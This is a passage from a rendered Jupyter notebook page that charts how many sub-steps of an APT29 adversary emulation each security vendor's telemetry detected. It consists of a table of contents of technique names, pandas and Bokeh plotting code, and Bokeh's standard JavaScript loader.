     Detection Type:Telemetry(Correlated)
    </a>
   </li>
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id53">
     Detection Type:technique(Alert)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#a-1-remote-system-discovery">
   8.A.1. Remote System Discovery
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id54">
     Detection Type:Telemetry(Correlated)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#a-2-remote-system-discovery">
   8.A.2. Remote System Discovery
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id55">
     Detection Type:Telemetry(Correlated)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#a-3-process-discovery">
   8.A.3. Process Discovery
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id56">
     Detection Type:Telemetry(Correlated)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#b-1-remote-file-copy">
   8.B.1. Remote File Copy
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id57">
     Detection Type:Telemetry(None)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#b-2-software-packing">
   8.B.2. Software Packing
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id58">
     Detection Type:None(None)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#c-1-valid-accounts">
   8.C.1. Valid Accounts
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id59">
     Detection Type:Telemetry(None)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#c-2-windows-admin-shares">
   8.C.2. Windows Admin Shares
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id60">
     Detection Type:Telemetry(None)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#c-3-service-execution">
   8.C.3. Service Execution
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id61">
     Detection Type:Telemetry(Correlated)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#id62">
   9.A.1. Remote File Copy
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id63">
     Detection Type:Telemetry(Correlated)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#a-2-remote-file-copy">
   9.A.2. Remote File Copy
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id64">
     Detection Type:Telemetry(Correlated)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#b-1-powershell">
   9.B.1. PowerShell
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id65">
     Detection Type:Telemetry(Correlated)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#b-2-file-and-directory-discovery">
   9.B.2. File and Directory Discovery
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id66">
     Detection Type:Telemetry(Correlated)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#b-3-automated-collection">
   9.B.3. Automated Collection
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id67">
     Detection Type:Telemetry(Correlated)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#b-4-data-from-local-system">
   9.B.4. Data from Local System
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id68">
     Detection Type:None(None)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#b-5-data-staged">
   9.B.5. Data Staged
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id69">
     Detection Type:Telemetry(Correlated)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#b-6-data-encrypted">
   9.B.6. Data Encrypted
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id70">
     Detection Type:Telemetry(Correlated)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#b-7-data-compressed">
   9.B.7. Data Compressed
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id71">
     Detection Type:Telemetry(Correlated)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#b-8-exfiltration-over-command-and-control-channel">
   9.B.8. Exfiltration Over Command and Control Channel
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id72">
     Detection Type:None(None)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#c-1-file-deletion">
   9.C.1. File Deletion
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id73">
     Detection Type:Telemetry(Correlated)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#c-2-file-deletion">
   9.C.2. File Deletion
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id74">
     Detection Type:Telemetry(Correlated)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#c-3-file-deletion">
   9.C.3. File Deletion
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id75">
     Detection Type:Telemetry(Correlated)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#c-4-file-deletion">
   9.C.4. File Deletion
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id76">
     Detection Type:Telemetry(Correlated)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#a-1-service-execution">
   10.A.1. Service Execution
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id77">
     Detection Type:Telemetry(None)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#id78">
   10.B.1. Registry Run Keys / Startup Folder
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id79">
     Detection Type:None(None)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#b-2-execution-through-api">
   10.B.2. Execution through API
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id80">
     Detection Type:None(None)
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#b-3-access-token-manipulation">
   10.B.3. Access Token Manipulation
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#id81">
     Detection Type:None(None)
    </a>
   </li>
  </ul>
 </li>
</ul>

        </nav>
    </div>
</div>
    <div id="main-content" class="row">
        <div class="col-12 col-md-9 pl-md-3 pr-md-0">
        
              <div>
                
  <div class="section" id="free-telemetry-notebook">
<h1>Free Telemetry Notebook<a class="headerlink" href="#free-telemetry-notebook" title="Permalink to this headline">¶</a></h1>
<table class="colwidths-auto table">
<thead>
<tr class="row-odd"><th class="text-align:left head"><p></p></th>
<th class="text-align:left head"><p></p></th>
</tr>
</thead>
<tbody>
<tr class="row-even"><td class="text-align:left"><p>Group</p></td>
<td class="text-align:left"><p>APT29</p></td>
</tr>
<tr class="row-odd"><td class="text-align:left"><p>Description</p></td>
<td class="text-align:left"><p>APT29 is a threat group that has been attributed to the Russian government and has operated since at least 2008. This group reportedly compromised the Democratic National Committee starting in the summer of 2015</p></td>
</tr>
<tr class="row-even"><td class="text-align:left"><p>Author</p></td>
<td class="text-align:left"><p><a class="reference external" href="https://github.com/OTRF/detection-hackathon-apt29">Open Threat Research - APT29 Detection Hackathon</a></p></td>
</tr>
</tbody>
</table>
<div class="section" id="telemetry-detection-category">
<h2>Telemetry Detection Category<a class="headerlink" href="#telemetry-detection-category" title="Permalink to this headline">¶</a></h2>
<div class="cell tag_hide-input docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="c1"># Importing Libraries</span>
<span class="kn">from</span> <span class="nn">bokeh.io</span> <span class="kn">import</span> <span class="n">show</span>
<span class="kn">from</span> <span class="nn">bokeh.plotting</span> <span class="kn">import</span> <span class="n">figure</span>
<span class="kn">from</span> <span class="nn">bokeh.models</span> <span class="kn">import</span> <span class="n">ColumnDataSource</span><span class="p">,</span> <span class="n">LabelSet</span><span class="p">,</span> <span class="n">HoverTool</span>
<span class="kn">from</span> <span class="nn">bokeh.transform</span> <span class="kn">import</span> <span class="n">dodge</span>
<span class="kn">import</span> <span class="nn">pandas</span> <span class="k">as</span> <span class="nn">pd</span>

<span class="c1"># You need to run this code at the beginning in order to show visualization using Jupyter Notebooks</span>
<span class="kn">from</span> <span class="nn">bokeh.io</span> <span class="kn">import</span> <span class="n">output_notebook</span>
<span class="n">output_notebook</span><span class="p">()</span>
<span class="n">apt29</span><span class="o">=</span> <span class="n">pd</span><span class="o">.</span><span class="n">read_json</span><span class="p">(</span><span class="s1">&#39;https://raw.githubusercontent.com/OTRF/ThreatHunter-Playbook/master/docs/evals/apt29/data/otr_results.json&#39;</span><span class="p">)</span>
<span class="n">summary</span> <span class="o">=</span> <span class="p">(</span>
    <span class="n">apt29</span>
    <span class="o">.</span><span class="n">groupby</span><span class="p">([</span><span class="s1">&#39;step&#39;</span><span class="p">,</span><span class="s1">&#39;stepname&#39;</span><span class="p">])</span><span class="o">.</span><span class="n">agg</span><span class="p">(</span><span class="n">total</span><span class="o">=</span><span class="n">pd</span><span class="o">.</span><span class="n">NamedAgg</span><span class="p">(</span><span class="n">column</span><span class="o">=</span><span class="s2">&quot;substep&quot;</span><span class="p">,</span> <span class="n">aggfunc</span><span class="o">=</span><span class="s2">&quot;nunique&quot;</span><span class="p">))</span>
    <span class="o">.</span><span class="n">join</span><span class="p">(</span>
        <span class="n">apt29</span><span class="p">[</span><span class="n">apt29</span><span class="p">[</span><span class="s1">&#39;detectiontype&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;Telemetry&#39;</span><span class="p">]</span>
        <span class="o">.</span><span class="n">groupby</span><span class="p">([</span><span class="s1">&#39;step&#39;</span><span class="p">,</span><span class="s1">&#39;stepname&#39;</span><span class="p">])</span><span class="o">.</span><span class="n">agg</span><span class="p">(</span><span class="n">telemetry</span><span class="o">=</span><span class="n">pd</span><span class="o">.</span><span class="n">NamedAgg</span><span class="p">(</span><span class="n">column</span><span class="o">=</span><span class="s2">&quot;vendor&quot;</span><span class="p">,</span> <span class="n">aggfunc</span><span class="o">=</span><span class="s2">&quot;count&quot;</span><span class="p">))</span>
    <span class="p">)</span>
<span class="p">)</span><span class="o">.</span><span class="n">reset_index</span><span class="p">()</span>
<span class="n">summary</span><span class="p">[</span><span class="s1">&#39;percentage&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">summary</span><span class="p">[</span><span class="s1">&#39;telemetry&#39;</span><span class="p">]</span> <span class="o">/</span> <span class="n">summary</span><span class="p">[</span><span class="s1">&#39;total&#39;</span><span class="p">])</span><span class="o">.</span><span class="n">map</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">{:.0%}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">)</span>
<span class="c1"># Get Total Average Telemetry coverage</span>
<span class="n">total_avg_percentage</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="si">{0:.0f}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">((</span><span class="n">summary</span><span class="p">[</span><span class="s1">&#39;telemetry&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">sum</span><span class="p">()</span> <span class="o">/</span> <span class="n">summary</span><span class="p">[</span><span class="s1">&#39;total&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">sum</span><span class="p">()</span> <span class="o">*</span> <span class="mi">100</span><span class="p">))</span>

<span class="c1"># Lists of values to create ColumnDataSource</span>
<span class="n">stepname</span> <span class="o">=</span> <span class="n">summary</span><span class="p">[</span><span class="s1">&#39;stepname&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">tolist</span><span class="p">()</span>
<span class="n">total</span> <span class="o">=</span> <span class="n">summary</span><span class="p">[</span><span class="s1">&#39;total&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">tolist</span><span class="p">()</span>
<span class="n">telemetry</span> <span class="o">=</span> <span class="n">summary</span><span class="p">[</span><span class="s1">&#39;telemetry&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">tolist</span><span class="p">()</span>
<span class="n">percentage</span> <span class="o">=</span> <span class="n">summary</span><span class="p">[</span><span class="s1">&#39;percentage&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">tolist</span><span class="p">()</span>

<span class="c1"># Creating ColumnDataSource object: source of data for visualization</span>
<span class="n">source</span> <span class="o">=</span> <span class="n">ColumnDataSource</span><span class="p">(</span><span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;stepname&#39;</span><span class="p">:</span><span class="n">stepname</span><span class="p">,</span><span class="s1">&#39;sub-Steps&#39;</span><span class="p">:</span><span class="n">total</span><span class="p">,</span><span class="s1">&#39;covered&#39;</span><span class="p">:</span><span class="n">telemetry</span><span class="p">,</span><span class="s1">&#39;percentage&#39;</span><span class="p">:</span><span class="n">percentage</span><span class="p">})</span>

<span class="c1"># Defining HoverTool object (Display info with Mouse): It is applied to chart named &#39;needHover&#39;</span>
<span class="n">hover_tool</span> <span class="o">=</span> <span class="n">HoverTool</span><span class="p">(</span><span class="n">names</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;needHover&#39;</span><span class="p">],</span><span class="n">tooltips</span> <span class="o">=</span> <span class="p">[(</span><span class="s2">&quot;Covered&quot;</span><span class="p">,</span> <span class="s2">&quot;@covered&quot;</span><span class="p">),(</span><span class="s2">&quot;Percentage&quot;</span><span class="p">,</span> <span class="s2">&quot;@percentage&quot;</span><span class="p">)])</span>

<span class="c1"># Creating Figure</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">figure</span><span class="p">(</span><span class="n">x_range</span><span class="o">=</span><span class="n">stepname</span><span class="p">,</span><span class="n">y_range</span><span class="o">=</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">23</span><span class="p">),</span><span class="n">plot_height</span><span class="o">=</span><span class="mi">550</span><span class="p">,</span><span class="n">plot_width</span><span class="o">=</span><span class="mi">600</span><span class="p">,</span><span class="n">toolbar_location</span><span class="o">=</span><span class="s1">&#39;right&#39;</span><span class="p">,</span><span class="n">tools</span><span class="o">=</span><span class="p">[</span><span class="n">hover_tool</span><span class="p">])</span>

<span class="c1"># Creating Vertical Bar Charts</span>
<span class="n">p</span><span class="o">.</span><span class="n">vbar</span><span class="p">(</span><span class="n">x</span><span class="o">=</span><span class="n">dodge</span><span class="p">(</span><span class="s1">&#39;stepname&#39;</span><span class="p">,</span><span class="mf">0.0</span><span class="p">,</span><span class="nb">range</span><span class="o">=</span><span class="n">p</span><span class="o">.</span><span class="n">x_range</span><span class="p">),</span><span class="n">top</span><span class="o">=</span><span class="s1">&#39;sub-Steps&#39;</span><span class="p">,</span><span class="n">width</span><span class="o">=</span><span class="mf">0.7</span><span class="p">,</span><span class="n">source</span><span class="o">=</span><span class="n">source</span><span class="p">,</span><span class="n">color</span><span class="o">=</span><span class="s2">&quot;#c9d9d3&quot;</span><span class="p">,</span><span class="n">legend_label</span><span class="o">=</span><span class="s2">&quot;Total&quot;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">vbar</span><span class="p">(</span><span class="n">x</span><span class="o">=</span><span class="n">dodge</span><span class="p">(</span><span class="s1">&#39;stepname&#39;</span><span class="p">,</span><span class="mf">0.0</span><span class="p">,</span> <span class="nb">range</span><span class="o">=</span><span class="n">p</span><span class="o">.</span><span class="n">x_range</span><span class="p">),</span><span class="n">top</span><span class="o">=</span><span class="s1">&#39;covered&#39;</span><span class="p">,</span><span class="n">width</span><span class="o">=</span><span class="mf">0.7</span><span class="p">,</span><span class="n">source</span><span class="o">=</span><span class="n">source</span><span class="p">,</span><span class="n">color</span><span class="o">=</span><span class="s2">&quot;#718dbf&quot;</span><span class="p">,</span><span class="n">legend_label</span><span class="o">=</span><span class="s2">&quot;Covered&quot;</span><span class="p">,</span> <span class="n">name</span> <span class="o">=</span> <span class="s1">&#39;needHover&#39;</span><span class="p">)</span>

<span class="c1"># Adding Legend</span>
<span class="n">p</span><span class="o">.</span><span class="n">legend</span><span class="o">.</span><span class="n">location</span> <span class="o">=</span> <span class="s2">&quot;top_right&quot;</span>
<span class="n">p</span><span class="o">.</span><span class="n">legend</span><span class="o">.</span><span class="n">orientation</span> <span class="o">=</span> <span class="s2">&quot;vertical&quot;</span>
<span class="n">p</span><span class="o">.</span><span class="n">legend</span><span class="o">.</span><span class="n">border_line_width</span> <span class="o">=</span> <span class="mi">3</span>
<span class="n">p</span><span class="o">.</span><span class="n">legend</span><span class="o">.</span><span class="n">border_line_color</span> <span class="o">=</span> <span class="s2">&quot;black&quot;</span>
<span class="n">p</span><span class="o">.</span><span class="n">legend</span><span class="o">.</span><span class="n">border_line_alpha</span> <span class="o">=</span> <span class="mf">0.3</span>

<span class="c1"># Adding Title</span>
<span class="n">p</span><span class="o">.</span><span class="n">title</span><span class="o">.</span><span class="n">text</span> <span class="o">=</span> <span class="s1">&#39;Telemetry Detection Category (Average Coverage: </span><span class="si">{}</span><span class="s1">%)&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">total_avg_percentage</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">title</span><span class="o">.</span><span class="n">align</span> <span class="o">=</span> <span class="s1">&#39;center&#39;</span>
<span class="n">p</span><span class="o">.</span><span class="n">title</span><span class="o">.</span><span class="n">text_font_size</span> <span class="o">=</span> <span class="s1">&#39;12pt&#39;</span>

<span class="c1"># Adding Axis Labels</span>
<span class="n">p</span><span class="o">.</span><span class="n">xaxis</span><span class="o">.</span><span class="n">axis_label</span> <span class="o">=</span> <span class="s1">&#39;Emulation Steps&#39;</span>
<span class="n">p</span><span class="o">.</span><span class="n">xaxis</span><span class="o">.</span><span class="n">major_label_orientation</span> <span class="o">=</span> <span class="mi">45</span>

<span class="n">p</span><span class="o">.</span><span class="n">yaxis</span><span class="o">.</span><span class="n">axis_label</span> <span class="o">=</span> <span class="s1">&#39;Count of Sub-Steps&#39;</span>

<span class="c1"># Adding Data Label: Only for total of sub-steps</span>
<span class="n">total_label</span> <span class="o">=</span> <span class="n">LabelSet</span><span class="p">(</span><span class="n">x</span><span class="o">=</span><span class="s1">&#39;stepname&#39;</span><span class="p">,</span><span class="n">y</span><span class="o">=</span><span class="s1">&#39;sub-Steps&#39;</span><span class="p">,</span><span class="n">text</span><span class="o">=</span><span class="s1">&#39;sub-Steps&#39;</span><span class="p">,</span><span class="n">text_align</span><span class="o">=</span><span class="s1">&#39;center&#39;</span><span class="p">,</span><span class="n">level</span><span class="o">=</span><span class="s1">&#39;glyph&#39;</span><span class="p">,</span><span class="n">source</span><span class="o">=</span> <span class="n">source</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">add_layout</span><span class="p">(</span><span class="n">total_label</span><span class="p">)</span>

<span class="c1">#Showing visualization</span>
<span class="n">show</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_html">
<div class="bk-root">
    <a href="https://bokeh.org" target="_blank" class="bk-logo bk-logo-small bk-logo-notebook"></a>
    <span id="1001">Loading BokehJS ...</span>
</div></div><script type="application/javascript">
(function(root) {
  function now() {
    return new Date();
  }

  var force = true;

  if (typeof root._bokeh_onload_callbacks === "undefined" || force === true) {
    root._bokeh_onload_callbacks = [];
    root._bokeh_is_loading = undefined;
  }

  var JS_MIME_TYPE = 'application/javascript';
  var HTML_MIME_TYPE = 'text/html';
  var EXEC_MIME_TYPE = 'application/vnd.bokehjs_exec.v0+json';
  var CLASS_NAME = 'output_bokeh rendered_html';

  /**
   * Render data to the DOM node
   */
  function render(props, node) {
    var script = document.createElement("script");
    node.appendChild(script);
  }

  /**
   * Handle when an output is cleared or removed
   */
  function handleClearOutput(event, handle) {
    var cell = handle.cell;

    var id = cell.output_area._bokeh_element_id;
    var server_id = cell.output_area._bokeh_server_id;
    // Clean up Bokeh references
    if (id != null && id in Bokeh.index) {
      Bokeh.index[id].model.document.clear();
      delete Bokeh.index[id];
    }

    if (server_id !== undefined) {
      // Clean up Bokeh references
      var cmd = "from bokeh.io.state import curstate; print(curstate().uuid_to_server['" + server_id + "'].get_sessions()[0].document.roots[0]._id)";
      cell.notebook.kernel.execute(cmd, {
        iopub: {
          output: function(msg) {
            var id = msg.content.text.trim();
            if (id in Bokeh.index) {
              Bokeh.index[id].model.document.clear();
              delete Bokeh.index[id];
            }
          }
        }
      });
      // Destroy server and session
      var cmd = "import bokeh.io.notebook as ion; ion.destroy_server('" + server_id + "')";
      cell.notebook.kernel.execute(cmd);
    }
  }

  /**
   * Handle when a new output is added
   */
  function handleAddOutput(event, handle) {
    var output_area = handle.output_area;
    var output = handle.output;

    // limit handleAddOutput to display_data with EXEC_MIME_TYPE content only
    if ((output.output_type != "display_data") || (!output.data.hasOwnProperty(EXEC_MIME_TYPE))) {
      return
    }

    var toinsert = output_area.element.find("." + CLASS_NAME.split(' ')[0]);

    if (output.metadata[EXEC_MIME_TYPE]["id"] !== undefined) {
      toinsert[toinsert.length - 1].firstChild.textContent = output.data[JS_MIME_TYPE];
      // store reference to embed id on output_area
      output_area._bokeh_element_id = output.metadata[EXEC_MIME_TYPE]["id"];
    }
    if (output.metadata[EXEC_MIME_TYPE]["server_id"] !== undefined) {
      var bk_div = document.createElement("div");
      bk_div.innerHTML = output.data[HTML_MIME_TYPE];
      var script_attrs = bk_div.children[0].attributes;
      for (var i = 0; i < script_attrs.length; i++) {
        toinsert[toinsert.length - 1].firstChild.setAttribute(script_attrs[i].name, script_attrs[i].value);
        toinsert[toinsert.length - 1].firstChild.textContent = bk_div.children[0].textContent
      }
      // store reference to server id on output_area
      output_area._bokeh_server_id = output.metadata[EXEC_MIME_TYPE]["server_id"];
    }
  }

  function register_renderer(events, OutputArea) {

    function append_mime(data, metadata, element) {
      // create a DOM node to render to
      var toinsert = this.create_output_subarea(
        metadata,
        CLASS_NAME,
        EXEC_MIME_TYPE
      );
      this.keyboard_manager.register_events(toinsert);
      // Render to node
      var props = {data: data, metadata: metadata[EXEC_MIME_TYPE]};
      render(props, toinsert[toinsert.length - 1]);
      element.append(toinsert);
      return toinsert
    }

    /* Handle when an output is cleared or removed */
    events.on('clear_output.CodeCell', handleClearOutput);
    events.on('delete.Cell', handleClearOutput);

    /* Handle when a new output is added */
    events.on('output_added.OutputArea', handleAddOutput);

    /**
     * Register the mime type and append_mime function with output_area
     */
    OutputArea.prototype.register_mime_type(EXEC_MIME_TYPE, append_mime, {
      /* Is output safe? */
      safe: true,
      /* Index of renderer in `output_area.display_order` */
      index: 0
    });
  }

  // register the mime type if in Jupyter Notebook environment and previously unregistered
  if (root.Jupyter !== undefined) {
    var events = require('base/js/events');
    var OutputArea = require('notebook/js/outputarea').OutputArea;

    if (OutputArea.prototype.mime_types().indexOf(EXEC_MIME_TYPE) == -1) {
      register_renderer(events, OutputArea);
    }
  }

  
  if (typeof (root._bokeh_timeout) === "undefined" || force === true) {
    root._bokeh_timeout = Date.now() + 5000;
    root._bokeh_failed_load = false;
  }

  var NB_LOAD_WARNING = {'data': {'text/html':
     "<div style='background-color: #fdd'>\n"+
     "<p>\n"+
     "BokehJS does not appear to have successfully loaded. If loading BokehJS from CDN, this \n"+
     "may be due to a slow or bad network connection. Possible fixes:\n"+
     "</p>\n"+
     "<ul>\n"+
     "<li>re-rerun `output_notebook()` to attempt to load from CDN again, or</li>\n"+
     "<li>use INLINE resources instead, as so:</li>\n"+
     "</ul>\n"+
     "<code>\n"+
     "from bokeh.resources import INLINE\n"+
     "output_notebook(resources=INLINE)\n"+
     "</code>\n"+
     "</div>"}};

  function display_loaded() {
    var el = document.getElementById("1001");
    if (el != null) {
      el.textContent = "BokehJS is loading...";
    }
    if (root.Bokeh !== undefined) {
      if (el != null) {
        el.textContent = "BokehJS " + root.Bokeh.version + " successfully loaded.";
      }
    } else if (Date.now() < root._bokeh_timeout) {
      setTimeout(display_loaded, 100)
    }
  }


  function run_callbacks() {
    try {
      root._bokeh_onload_callbacks.forEach(function(callback) {
        if (callback != null)
          callback();
      });
    } finally {
      delete root._bokeh_onload_callbacks
    }
    console.debug("Bokeh: all callbacks have finished");
  }

  function load_libs(css_urls, js_urls, callback) {
    if (css_urls == null) css_urls = [];
    if (js_urls == null) js_urls = [];

    root._bokeh_onload_callbacks.push(callback);
    if (root._bokeh_is_loading > 0) {
      console.debug("Bokeh: BokehJS is being loaded, scheduling callback at", now());
      return null;
    }
    if (js_urls == null || js_urls.length === 0) {
      run_callbacks();
      return null;
    }
    console.debug("Bokeh: BokehJS not loaded, scheduling load and callback at", now());
    root._bokeh_is_loading = css_urls.length + js_urls.length;

    function on_load() {
      root._bokeh_is_loading--;
      if (root._bokeh_is_loading === 0) {
        console.debug("Bokeh: all BokehJS libraries/stylesheets loaded");
        run_callbacks()
      }
    }

    function on_error() {
      console.error("failed to load " + url);
    }

    for (var i = 0; i < css_urls.length; i++) {
      var url = css_urls[i];
      const element = document.createElement("link");
      element.onload = on_load;
      element.onerror = on_error;
      element.rel = "stylesheet";
      element.type = "text/css";
      element.href = url;
      console.debug("Bokeh: injecting link tag for BokehJS stylesheet: ", url);
      document.body.appendChild(element);
    }

    const hashes = {"https://cdn.bokeh.org/bokeh/release/bokeh-2.2.2.min.js": "JayppSWSRBsibIZqI8S4vAb1oFgLL0uhNvSn8cmArlOvYOwfFjYeyY5UWwJ+K0SU", "https://cdn.bokeh.org/bokeh/release/bokeh-widgets-2.2.2.min.js": "G0/Tv/Yy/zEPNsnW0Qif/FOsGesd+KIrKg/QLmvQmReuUW9qmSP7mAmr0VpiUNr3", "https://cdn.bokeh.org/bokeh/release/bokeh-tables-2.2.2.min.js": "VLYHEbLQDk5G1+/4ALU0myoJPMEUsngWry2fzYorFOUmarjGRPLLURaeK/on6JqX"};

    for (var i = 0; i < js_urls.length; i++) {
      var url = js_urls[i];
      var element = document.createElement('script');
      element.onload = on_load;
      element.onerror = on_error;
      element.async = false;
      element.src = url;
      if (url in hashes) {
        element.crossOrigin = "anonymous";
        element.integrity = "sha384-" + hashes[url];
      }
      console.debug("Bokeh: injecting script tag for BokehJS library: ", url);
      document.head.appendChild(element);
    }
  };

  function inject_raw_css(css) {
    const element = document.createElement("style");
    element.appendChild(document.createTextNode(css));
    document.body.appendChild(element);
  }

  
  var js_urls = ["https://cdn.bokeh.org/bokeh/release/bokeh-2.2.2.min.js", "https://cdn.bokeh.org/bokeh/release/bokeh-widgets-2.2.2.min.js", "https://cdn.bokeh.org/bokeh/release/bokeh-tables-2.2.2.min.js"];
  var css_urls = [];
  

  var inline_js = [
    function(Bokeh) {
      Bokeh.set_log_level("info");
    },
    function(Bokeh) {
    
    
    }
  ];

  function run_inline_js() {
    
    if (root.Bokeh !== undefined || force === true) {
      
    for (var i = 0; i < inline_js.length; i++) {
      inline_js[i].call(root, root.Bokeh);
    }
    if (force === true) {
        display_loaded();
      }} else if (Date.now() < root._bokeh_timeout) {
